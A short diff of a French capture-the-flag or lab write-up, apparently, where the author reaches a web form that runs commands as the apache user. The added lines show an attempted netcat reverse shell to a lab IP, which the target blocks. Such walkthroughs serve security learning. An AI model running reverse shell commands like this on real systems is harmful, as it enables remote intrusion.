@@ -142,4 +142,8 @@ Me voilà identifié !
 Sur cette nouvelle page, je suis en présence d'un formulaire qui me permet d'exécuter des commandes :
 - whoami => apache
 - id => uid=48(apache) gid=48(apache) groups=48(apache)
-- etc.
+- nc -e /bin/sh 192.168.56.101 1234
+
+Avec cette dernière commande, j'ai le message ```Remote connections are forbidden``` qui s'affiche.
+L'utilisation d'une adresse IP dans la commande est interdite !
+
